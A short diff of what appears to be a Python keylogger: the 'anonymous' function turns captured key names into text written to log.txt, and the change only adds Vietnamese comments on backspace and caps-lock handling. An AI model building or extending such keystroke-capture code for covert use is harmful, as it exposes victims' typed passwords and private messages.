@@ -50,16 +50,22 @@ def anonymous(key):
         key = " delete\n "
     if key == "[`]":
         key = "`"
+    
+    # * Khi gõ backspace thì sẽ xóa một ký tự trong file log.txt
     if key == "Key.backspace":
         key = ""
         with open("log.txt", 'rb+') as file:
             file.seek(-1, os.SEEK_END)
             file.truncate()
+    
     if key == "Key.tab":
         key = " tab\n "
+    
+    # * Khi nhấn caps_lock thì sẽ tăng giá trị biến capslock
     if key == "Key.caps_lock":
         capslock = capslock + 1
         key = ""
+    
     if key == "Key.enter":
         key = " enter\n "
     if key == "Key.shift" or key == "Key.shift_r":
